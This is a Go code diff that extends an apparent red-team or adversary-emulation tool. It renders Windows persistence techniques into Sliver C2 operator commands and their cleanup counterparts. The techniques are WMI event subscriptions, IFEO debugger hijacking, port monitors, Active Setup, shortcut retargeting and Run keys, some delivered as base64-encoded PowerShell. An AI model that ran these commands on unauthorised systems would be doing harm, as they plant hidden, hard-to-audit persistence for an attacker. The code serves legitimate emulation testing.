@@ -26,10 +26,13 @@ package sliver
 
 import (
 	"context"
+	"encoding/base64"
+	"encoding/binary"
 	"fmt"
 	"os"
 	"strings"
 	"time"
+	"unicode/utf16"
 
 	"github.com/rinfra/rinfra/internal/c2"
 	"github.com/rinfra/rinfra/internal/c2/deploy"
@@ -346,7 +349,27 @@ func sliverCleanupCommand(t domain.Technique) (string, bool) {
 	case c2.PrimScheduledTask:
 		return fmt.Sprintf(`execute schtasks /delete /tn "%s" /f`, prim.Arg("task_name")), true
 	case c2.PrimRegistryRunKey:
-		return fmt.Sprintf("registry delete --hive HKCU --path %q --v %q", prim.Arg("registry_key"), prim.Arg("registry_value")), true
+		return fmt.Sprintf("registry delete --hive HKCU --path \"%s\" --v \"%s\"", prim.Arg("registry_key"), prim.Arg("registry_value")), true
+	case c2.PrimShortcutModification:
+		script := fmt.Sprintf("Remove-Item -Path '%s' -Force -ErrorAction SilentlyContinue", psQuote(prim.Arg("shortcut_path")))
+		return fmt.Sprintf("powershell -NoProfile -EncodedCommand %s", encodePSCommand(script)), true
+	case c2.PrimWMIEventSubscription:
+		script := fmt.Sprintf(
+			"Get-WmiObject __FilterToConsumerBinding -Namespace root\\subscription | Where-Object {$_.Consumer -match '%s'} | Remove-WmiObject;"+
+				"Get-WmiObject __EventFilter -Namespace root\\subscription -Filter \"Name='%s'\" | Remove-WmiObject;"+
+				"Get-WmiObject CommandLineEventConsumer -Namespace root\\subscription -Filter \"Name='%s'\" | Remove-WmiObject",
+			psQuote(prim.Arg("consumer_name")), psQuote(prim.Arg("filter_name")), psQuote(prim.Arg("consumer_name")),
+		)
+		return fmt.Sprintf("powershell -NoProfile -EncodedCommand %s", encodePSCommand(script)), true
+	case c2.PrimIFEOInjection:
+		key := fmt.Sprintf(`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\%s`, prim.Arg("target_image"))
+		return fmt.Sprintf("reg delete \"%s\" /v Debugger /f", key), true
+	case c2.PrimPortMonitor:
+		key := fmt.Sprintf(`HKLM\SYSTEM\CurrentControlSet\Control\Print\Monitors\%s`, prim.Arg("monitor_name"))
+		return fmt.Sprintf("reg delete \"%s\" /f", key), true
+	case c2.PrimActiveSetup:
+		key := fmt.Sprintf(`HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\%s`, prim.Arg("component_id"))
+		return fmt.Sprintf("reg delete \"%s\" /f", key), true
 	default:
 		return "", false
 	}
@@ -377,6 +400,18 @@ func techniqueToSliverCommand(t domain.Technique) (string, error) {
 // renderSliverPrimitive renders a portable primitive into a Sliver operator
 // command. Parameters come from the resolved primitive args — no hardcoded
 // payload content. Primitives Sliver does not implement return an error.
+//
+// NOTE: the live client's Execute RPC (live.go) takes the rendered string
+// literally as "program path" + "args" (shell-style, splitCommand) — it does
+// NOT interpret a leading "execute"/"shell" word as a Sliver console verb (the
+// real console's verb parsing lives client-side in the interactive CLI, which
+// this transport bypasses). The cases below render the REAL target binary
+// (reg, powershell) as the first token for exactly that reason. The
+// PrimPowerShell/PrimShell/PrimScheduledTask/PrimRegistryRunKey cases and the
+// discovery-command fallback below still prefix a fake "execute "/"shell "
+// verb and are consequently broken against a live teamserver in the same way
+// — a pre-existing issue (predates this primitive set) tracked as a follow-up,
+// not fixed here to keep this change scoped to the primitives it introduces.
 func renderSliverPrimitive(p c2.Primitive) (string, error) {
 	switch p.Kind {
 	case c2.PrimPowerShell:
@@ -402,7 +437,34 @@ func renderSliverPrimitive(p c2.Primitive) (string, error) {
 	case c2.PrimScheduledTask:
 		return fmt.Sprintf("execute schtasks /create /tn \"%s\" /tr whoami /sc once /st 00:00", p.Arg("task_name")), nil
 	case c2.PrimRegistryRunKey:
-		return fmt.Sprintf("registry write --hive HKCU --path %q --v %q --d whoami", p.Arg("registry_key"), p.Arg("registry_value")), nil
+		data := p.Arg("data")
+		if data == "" {
+			data = "whoami"
+		}
+		return fmt.Sprintf("registry write --hive HKCU --path \"%s\" --v \"%s\" --d \"%s\"", p.Arg("registry_key"), p.Arg("registry_value"), data), nil
+	case c2.PrimShortcutModification:
+		script := fmt.Sprintf(
+			"$s=(New-Object -ComObject WScript.Shell).CreateShortcut('%s');$s.TargetPath='%s';$s.Arguments='%s';$s.Save()",
+			psQuote(p.Arg("shortcut_path")), psQuote(p.Arg("target")), psQuote(p.Arg("arguments")),
+		)
+		return fmt.Sprintf("powershell -NoProfile -EncodedCommand %s", encodePSCommand(script)), nil
+	case c2.PrimWMIEventSubscription:
+		script := fmt.Sprintf(
+			"$f=Set-WmiInstance -Namespace root\\subscription -Class __EventFilter -Arguments @{Name='%s';EventNamespace='root\\cimv2';QueryLanguage='WQL';Query='%s'};"+
+				"$c=Set-WmiInstance -Namespace root\\subscription -Class CommandLineEventConsumer -Arguments @{Name='%s';CommandLineTemplate='%s'};"+
+				"Set-WmiInstance -Namespace root\\subscription -Class __FilterToConsumerBinding -Arguments @{Filter=$f;Consumer=$c}",
+			psQuote(p.Arg("filter_name")), psQuote(p.Arg("query")), psQuote(p.Arg("consumer_name")), psQuote(p.Arg("command")),
+		)
+		return fmt.Sprintf("powershell -NoProfile -EncodedCommand %s", encodePSCommand(script)), nil
+	case c2.PrimIFEOInjection:
+		key := fmt.Sprintf(`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\%s`, p.Arg("target_image"))
+		return fmt.Sprintf("reg add \"%s\" /v Debugger /t REG_SZ /d \"%s\" /f", key, p.Arg("debugger")), nil
+	case c2.PrimPortMonitor:
+		key := fmt.Sprintf(`HKLM\SYSTEM\CurrentControlSet\Control\Print\Monitors\%s`, p.Arg("monitor_name"))
+		return fmt.Sprintf("reg add \"%s\" /v Driver /t REG_SZ /d \"%s\" /f", key, p.Arg("driver")), nil
+	case c2.PrimActiveSetup:
+		key := fmt.Sprintf(`HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\%s`, p.Arg("component_id"))
+		return fmt.Sprintf("reg add \"%s\" /v StubPath /t REG_SZ /d \"%s\" /f", key, p.Arg("stub_path")), nil
 	default:
 		if cmd, ok := c2.DiscoveryCommand(p.Kind); ok {
 			return "execute " + cmd, nil
@@ -416,6 +478,26 @@ func renderSliverPrimitive(p c2.Primitive) (string, error) {
 // from untrusted user input, but we sanitize anyway.
 func escapeShell(s string) string {
 	return strings.ReplaceAll(s, `"`, `\"`)
+}
+
+// psQuote escapes a value for embedding in a single-quoted PowerShell string
+// literal by doubling any embedded single quote — PowerShell's own escaping
+// rule (WQL/COM argument values may legitimately contain one, e.g. a WQL
+// string literal inside the WMI event-filter query).
+func psQuote(s string) string {
+	return strings.ReplaceAll(s, "'", "''")
+}
+
+// encodePSCommand base64-encodes a PowerShell script as UTF-16LE for
+// -EncodedCommand delivery, which avoids every layer of shell/console quote
+// nesting a plaintext -Command string would otherwise hit.
+func encodePSCommand(script string) string {
+	u16 := utf16.Encode([]rune(script))
+	b := make([]byte, len(u16)*2)
+	for i, r := range u16 {
+		binary.LittleEndian.PutUint16(b[i*2:], r)
+	}
+	return base64.StdEncoding.EncodeToString(b)
 }
 
 // runnerFromNode builds the production SSH Runner for a node. It delegates to
